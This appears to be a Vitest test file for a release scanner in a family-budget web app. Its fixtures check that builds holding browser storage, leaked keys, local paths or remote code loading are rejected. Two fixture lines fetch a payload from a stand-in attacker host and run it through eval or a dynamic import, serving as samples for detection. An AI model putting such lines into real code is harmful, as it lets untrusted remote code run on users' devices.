/// <reference types="node" />
import { spawnSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";

const appDirectory = fileURLToPath(new URL("../", import.meta.url));
const scannerPath = join(appDirectory, "scripts/release-scan.mjs");
const securityHeaders = JSON.parse(
  readFileSync(join(appDirectory, "security-headers.json"), "utf8"),
) as Record<string, string>;
const temporaryDirectories: string[] = [];

interface ScanFixture {
  readonly androidConfig: string;
  readonly dist: string;
}

function write(path: string, contents: string) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, contents, "utf8");
}

function createScanFixture(): ScanFixture {
  const root = mkdtempSync(join(tmpdir(), "family-budget-release-scan-test-"));
  temporaryDirectories.push(root);
  const dist = join(root, "dist");
  const androidConfig = join(root, "capacitor.config.ts");

  write(
    join(dist, "index.html"),
    '<!doctype html><script type="module" src="/assets/index-safe.js"></script>',
  );
  write(
    join(dist, "assets/index-safe.js"),
    'const diagnostic = "https://react.dev/errors/418"; export { diagnostic };',
  );
  write(
    join(dist, "sw.js"),
    'precacheAndRoute([{url:"build-meta.json",revision:"test"}]); NavigationRoute;',
  );
  write(join(dist, "build-meta.json"), '{"buildId":"scan-test"}\n');
  write(
    join(dist, "manifest.webmanifest"),
    JSON.stringify({
      display: "standalone",
      icons: [
        {
          purpose: "any",
          sizes: "192x192",
          src: "/icon-192.png",
        },
        {
          purpose: "any maskable",
          sizes: "512x512",
          src: "/icon-512.png",
        },
      ],
      id: "/",
      scope: "/",
      start_url: "/",
    }),
  );
  write(
    join(dist, "_headers"),
    `/*\n${Object.entries(securityHeaders)
      .map(([name, value]) => `  ${name}: ${value}`)
      .join("\n")}\n`,
  );
  write(androidConfig, 'export default { webDir: "../web-pwa/dist" };\n');

  return { androidConfig, dist };
}

function runScan(fixture: ScanFixture) {
  return spawnSync(
    process.execPath,
    [
      scannerPath,
      "--dist",
      fixture.dist,
      "--android-config",
      fixture.androidConfig,
    ],
    {
      encoding: "utf8",
      env: { ...process.env },
      timeout: 10_000,
    },
  );
}

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) {
    rmSync(directory, { force: true, recursive: true });
  }
});

describe("production release scanner", () => {
  it("accepts a clean split-free artifact containing a React diagnostic URL", () => {
    const result = runScan(createScanFixture());

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it("rejects browser storage in a code-split application chunk", () => {
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/budget-store-abc123.js"),
      'localStorage.setItem("budget", "private");',
    );

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "browser key/value storage access found in assets/budget-store-abc123.js",
    );
  });

  it.each([
    ["AWS access key", 'const leaked = "AKIAIOSFODNN7EXAMPLE";'],
    [
      "private key",
      'const leaked = "-----BEGIN PRIVATE KEY-----\\\\nprivate\\\\n-----END PRIVATE KEY-----";',
    ],
    ["absolute local filesystem path", 'const leaked = "/Users/alice/private/budget.json";'],
  ])("rejects %s in any text artifact", (label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "metadata.json"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(`${label} found in metadata.json`);
  });

  it.each([
    'fetch("https://evil.example/payload.js").then((response) => response.text()).then(eval);',
    'import("https://evil.example/payload.js");',
  ])("rejects remote executable acquisition: %s", (contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/lazy-feature.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "remote executable loading found in assets/lazy-feature.js",
    );
  });
});
